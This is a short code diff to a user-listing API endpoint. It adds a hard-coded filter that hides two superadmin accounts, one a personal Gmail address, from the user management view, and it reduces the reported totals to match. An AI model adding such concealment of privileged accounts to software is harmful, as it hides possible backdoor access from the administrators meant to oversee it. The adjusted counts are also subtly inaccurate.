@@ -215,11 +215,15 @@ async def list_users(
         search=search,
     )
     
-    pages = (total + pagination["page_size"] - 1) // pagination["page_size"]
+    # Hide internal system root/default superadmin accounts from user management UI
+    hidden_system_emails = {"admin@ndt.com", "mkumar.amiro@gmail.com"}
+    visible_users = [u for u in users if u.email.lower() not in hidden_system_emails]
+    total_count = total - (len(users) - len(visible_users))
+    pages = max(1, (total_count + pagination["page_size"] - 1) // pagination["page_size"])
     
     return UserListResponse(
-        items=[UserResponse.from_orm_with_locations(u) for u in users],
-        total=total,
+        items=[UserResponse.from_orm_with_locations(u) for u in visible_users],
+        total=total_count,
         page=pagination["page"],
         page_size=pagination["page_size"],
         pages=pages,
